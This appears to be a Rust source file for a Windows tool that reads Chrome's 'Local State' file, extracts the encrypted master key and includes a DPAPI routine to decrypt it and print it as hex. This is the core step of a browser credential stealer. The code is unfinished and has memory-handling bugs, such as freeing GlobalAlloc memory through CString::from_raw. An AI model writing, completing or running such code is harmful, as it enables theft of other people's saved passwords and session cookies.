use windows::core::PWSTR;
use windows::{Win32::Foundation::*, Win32::Security::*};
use std::ptr::null_mut;
use std::ptr::null;
use std::fs;
use std::env;
use std::path::Path;
use std::ffi::CString;
use windows::Win32::Security::Cryptography::{
    CryptStringToBinaryA, CRYPT_STRING_BASE64, CRYPT_INTEGER_BLOB, CryptUnprotectData,
};
use windows::Win32::System::Com::CoTaskMemFree;
use windows::Win32::System::Memory::{GlobalAlloc, GMEM_ZEROINIT};

fn get_master_key(cipher: *mut u8, key_size: u32) {
    let mut data_in = CRYPT_INTEGER_BLOB {
        pbData: cipher,
        cbData: key_size,
    };

    let mut data_out: CRYPT_INTEGER_BLOB = unsafe { std::mem::zeroed() };

    let result = unsafe {
        CryptUnprotectData(
            &data_in,
            None, // ppszdatadescr
            None, // poptionalentropy
            None, // pvreserved
            None, // ppromptstruct
            0,    // dwflags
            &mut data_out
        )
    };

    if let Ok(_) = result {
        let output_size = (data_out.cbData * 4) + 1;
        let mut output = Vec::with_capacity(output_size as usize);
        
        for i in 0..data_out.cbData {
            let byte = unsafe { *(data_out.pbData.add(i as usize)) };
            output.extend(format!("\\x{:02x}", byte).as_bytes());
        }

        println!("Master key is: {}", String::from_utf8_lossy(&output));
    } else {
        eprintln!("Failed to unprotect data: {:?}", result.err());
    }
}


fn extract_key(data: &str) -> Option<String> {
    const PATTERN: &str = "\"encrypted_key\":\"";

    if let Some(mut start) = data.find(PATTERN) {
        start += PATTERN.len();

        if let Some(end) = data[start..].find("\"") {
            let key_data = &data[start..start + end];
            let key_len = key_data.len();

            // Allocate memory using GlobalAlloc
            let mem_ptr = unsafe { GlobalAlloc(GMEM_ZEROINIT, key_len + 1) }.unwrap();
            
            if mem_ptr.0.is_null() {
                eprintln!("Failed to allocate memory.");
                return None;
            }

            // Copy data into allocated memory
            let key_cstr = CString::new(key_data).unwrap();
            unsafe { std::ptr::copy_nonoverlapping(key_cstr.as_ptr(), mem_ptr.0 as *mut i8, key_len) };

            println!("Allocating {} bytes for the base64 key", key_len);

            // Convert pointer to string and return
            let extracted_key = unsafe { CString::from_raw(mem_ptr.0 as *mut i8) }.to_str().unwrap().to_string();
            return Some(extracted_key);
        } else {
            eprintln!("ERROR: end of encrypted key pattern not found");
        }
    } else {
        eprintln!("ERROR: Encrypted key pattern not found");
    }

    None
}

fn get_data_from_path() -> Result<String, std::io::Error> {
    let mut path = env::home_dir().unwrap_or_default();
    path.push(r"AppData\Local\Google\Chrome\User Data\Local State");

    fs::read_to_string(&path)
}

fn main() {
    match get_data_from_path() {
        Ok(data) => {
            let data_str: &str = &data;
            // Do something with data_str
            //println!("{}", data_str);

            println!("{}", extract_key(&data).unwrap());
        },
        Err(e) => eprintln!("Failed to read the file: {}", e),
    }
}
// fn main() {
//     // Sample call
//     let cipher = vec![0u8; 10].into_boxed_slice(); // example data
//     get_master_key(cipher.as_ptr() as *mut _, cipher.len() as u32);
// }
